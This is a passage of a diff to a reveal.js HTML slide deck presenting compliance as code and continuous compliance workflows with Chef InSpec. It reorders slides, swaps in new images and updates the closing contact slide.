-					<h3>Upcoming</h3>
-					<ul class="vertical-list">
-						<li>More CIS profiles for Linux and Windows</li>
-						<li class=fragment>PCI, HIPAA, DISA STIG</li>
-					</ul>
-				</section>
-
-				<section>
-					<h1>MSCCM</h1>
-				</section> -->
-
-				<!--
-				PART 2: WORKFLOW
-				================
-				-->
-
-				<section>
-					<h2>Compliance as Code.</h2>
-					<img src="same.stack+workflow.png" alt="Same stack and workflow" />
-				</section>
-
-				<section>
-					<h2>Traditional workflow</h2>
-				</section>
-
-				<section>
-					<h2>Create new artifacts</h2>
-					<img src="old.workflow.1.png" alt="New artifact development flow" />
-				</section>
-
-				<section>
-					<h2>To reach production</h2>
-					<img src="old.workflow.png" alt="Development stopped by auditors" />
-				</section>
-
-				<section data-background="hoover.dam.jpg">
-          &nbsp;
-				</section>
-
-				<section>
-					<h2>Competitive Advantage</h2>
-					<img src="high.velocity.competitive.advantage.png" alt="Competitive Advantage" />
-					<h6>Book: The High Velocity Edge - Steven J. Spears</h6>
-				</section>
-
-				<section>
-					<h2>Safety at Velocity</h2>
-					<ul class="vertical-list">
-						<li class=fragment>Risk reduction when constantly changing your systems</li>
-						<li class=fragment>As part of the workflow. Not after, not later.</li>
-						<li class=fragment>Test for quality, Test for compliance</li>
-					</ul>
-				</section>
-
-				<!-- <section data-background="nuclear.jpeg">
-				</section> -->
-
-				<section>
-					<h2>DevOps workflow</h2>
-				</section>
-
-				<section>
-					<img src="compliance.workflow.png" alt="Compliance Workflow"/>
-				</section>
-
-				<section>
-					<h2>Create and test early on</h2>
-				</section>
-
-				<section data-background="ssh-profile.png">
-          &nbsp;
-				</section>
-
-				<section data-background="compliance-kitchen-test.png">
-          &nbsp;
-				</section>
-
-				<section>
-					<h2>Test continuously</h2>
-				</section>
-
-				<section data-background="delivery.integration.1.png">
-          &nbsp;
-				</section>
-
-				<section>
-					<h2>Deploy, Operate, Verify</h2>
-				</section>
-
-				<section data-background="ui.screenshot.png">
-          &nbsp;
-				</section>
-
-				<section>
-					<h2>One workflow cycle</h2>
-					<img src="compliance.workflow.png" alt="Compliance Workflow"/>
-				</section>
-
-				<section>
-					<h2>Full workflow</h2>
-					<img src="full.workflow.png" alt="Full Workflow"/>
-				</section>
-
-				<section>
-					<h2>Fixing The Compliance Cycle</h2>
-					<img src="compliance_cycle.png" alt="Fixing the compliance cycle" />
-				</section>
-
-					<section>
-						<h2>Compliance as Code.</h2>
-						<img src="same.stack+workflow.png" alt="Same stack and workflow" />
-					</section>
         <!--
-				<section>
-
-					<section>
-						<h1>Compliance and Chef</h1>
-					</section>
-
-					<section>
-						<h2>Remember when Compliance was released?</h2>
-					</section>
-
-					<section data-background="berlin.wall.jpg">
-					</section>
-
-					<section>
-						<h2>Chef Client as an <span class="fragment highlight-red">agent</span> for <span class="fragment highlight-blue">Compliance</span></h2>
-					</section>
-				</section>
+        PART 2: WORKFLOW
+        ================
         -->
 
-				<!-- <section>
-					<h2>The way forward</h2>
-					<ul>
-						<li class="fragment">Compliance profiles</li>
-						<li class="fragment">Workflow integration</li>
-					</ul>
-				</section> -->
+        <section>
+          <h1>Continuous compliance</h1>
+        </section>
 
 				<section>
-					<h2>Join InSpec</h2>
-					<h1><a href="https://github.com/chef/inspec" target="_blank">
-						<i class="icon-github-circled"></i>
-					</a></h1>
-					<h6><a href="https://github.com/chef/inspec" target="_blank">github.com/chef/inspec</a></h6>
-					<h6 style="font-size: 1.2vw"><a href="https://gitter.im/chef/inspec" target="_blank">gitter.im/chef/inspec</a></h6>
+          <h2>Create new artifacts</h2>
+          <img src="old.workflow.1.png" alt="New artifact development flow" />
+        </section>
+
+        <section>
+          <h2>To reach production</h2>
+          <img src="old.workflow.png" alt="Development stopped by auditors" />
+        </section>
+
+        <section data-background="hoover.dam.jpg">
+          &nbsp;
+        </section>
+
+        <section>
+          <img src="compliance.v.velocity.1.png" alt="Compliance v Velocity 1" width="70%" />
+        </section>
+        <section>
+          <img src="compliance.v.velocity.2.png" alt="Compliance v Velocity 2" width="70%" />
+        </section>
+        <section>
+          <img src="compliance.v.velocity.3.png" alt="Compliance v Velocity 3" width="70%" />
+        </section>
+
+        <section>
+          <img src="compliance.v.velocity.4.png" alt="Compliance v Velocity 4" width="90%" />
+        </section>
+
+        <!--
+        <section>
+          <h2>Competitive Advantage</h2>
+          <img src="high.velocity.competitive.advantage.png" alt="Competitive Advantage" />
+          <h6>Book: The High Velocity Edge - Steven J. Spears</h6>
+        </section>
+      -->
+
+        <section>
+          <h2>Continuous workflow</h2>
+        </section>
+
+        <section>
+          <img src="compliance.workflow.png" alt="Compliance Workflow"/>
+        </section>
+
+        <section>
+          <h2>Create and test early on</h2>
+        </section>
+
+        <section data-background="ssh-profile.png">
+          &nbsp;
+        </section>
+
+        <section data-background="compliance-kitchen-test.png">
+          &nbsp;
+        </section>
+
+        <section>
+          <h2>Test continuously</h2>
+        </section>
+
+        <section data-background="delivery.integration.1.png">
+          &nbsp;
+        </section>
+
+        <section>
+          <h2>Deploy, Operate, Verify</h2>
+        </section>
+
+        <section data-background="ui.screenshot.png">
+          &nbsp;
+        </section>
+
+        <section>
+          <h2>Continuous workflow</h2>
+          <img src="compliance.workflow.png" alt="Compliance Workflow"/>
+        </section>
+
+				<section data-background="race.cars.jpg">
+					&nbsp;
 				</section>
 
-				<section>
-					<h2>InSpec 1.0</h2>
-					<ul class="vertical-list">
-						<li class=fragment>Dependencies</li>
-						<li class=fragment>Attributes</li>
-					</ul>
-				</section>
+        <section>
+          <h2>Safety at Velocity</h2>
+          <ul class="vertical-list">
+            <li class=fragment>Risk reduction when constantly changing your systems</li>
+            <li class=fragment>As part of the workflow. Not after, not later.</li>
+            <li class=fragment>Test for quality, Test for compliance</li>
+          </ul>
+        </section>
 
-				<section>
-					<h2>Thank you</h2>
-					<div style="width: 100%;">
-						<div style="width: 47%; display: inline-block;">
-							<ul class="vertical-list" style="font-size: 1.0vw; display: block; text-align: center">
-								<li><a href="https://twitter.com/chri_hartmann"><i class="icon-twitter"></i>@chri_hartmann</a></li>
-								<li><a href="https://github.com/chris-rock"><i class="icon-github-circled"></i>chris-rock</a></li>
-								<li><a href="mailto:chartmann@chef.io"><i class="icon-mail-alt"></i>chartmann@chef.io</a></li>
-							</ul>
-						</div>
-						<div style="width: 47%; display: inline-block;">
-							<ul class="vertical-list" style="font-size: 1.0vw; display: block; text-align: center">
-								<li><a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a></li>
-								<li><a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a></li>
-								<li><a href="mailto:drichter@chef.io"><i class="icon-mail-alt"></i>drichter@chef.io</a></li>
-							</ul>
-						</div>
-					</div>
-				</section>
+        <section>
+          <h2>Fixing The Compliance Cycle</h2>
+          <img src="compliance_cycle.png" alt="Fixing the compliance cycle" />
+        </section>
 
-			</div>
+        <section>
+          <img src="work.together.png" alt="work together" />
+        </section>
 
-		</div>
+        <section>
+          <h2>Join InSpec</h2>
+          <h1><a href="https://github.com/chef/inspec" target="_blank">
+            <i class="icon-github-circled"></i>
+          </a></h1>
+          <h6><a href="https://github.com/chef/inspec" target="_blank">github.com/chef/inspec</a></h6>
+          <h6 style="font-size: 1.2vw"><a href="https://gitter.im/chef/inspec" target="_blank">gitter.im/chef/inspec</a></h6>
+        </section>
 
-		<script src="lib/js/head.min.js"></script>
-		<script src="js/reveal.js"></script>
+        <section>
+          <h2>Thank you</h2>
+          <div style="width: 100%;">
+            <div style="width: 47%; display: inline-block;">
+              <ul class="vertical-list" style="font-size: smaller; display: block; text-align: center">
+                <li>
+                  <a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a>
+                  <a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </section>
 
-		<script>
+      </div>
 
-			// Full list of configuration options available at:
-			// https://github.com/hakimel/reveal.js#configuration
-			Reveal.initialize({
-				controls: true,
-				progress: true,
-				history: true,
-				center: true,
+    </div>
 
-				transition: 'none', // none/fade/slide/convex/concave/zoom
+    <script src="lib/js/head.min.js"></script>
+    <script src="js/reveal.js"></script>
 
-				// Optional reveal.js plugins
-				dependencies: [
-					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
-					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
-					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
-					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
-					{ src: 'plugin/zoom-js/zoom.js', async: true },
-					{ src: 'plugin/notes/notes.js', async: true }
-				]
-			});
+    <script>
 
-		</script>
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
 
-	</body>
+        transition: 'none', // none/fade/slide/convex/concave/zoom
+
+        // Optional reveal.js plugins
+        dependencies: [
+          { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+          { src: 'plugin/zoom-js/zoom.js', async: true },
+          { src: 'plugin/notes/notes.js', async: true }
+        ]
+      });
+
+    </script>
+
+  </body>
 </html>
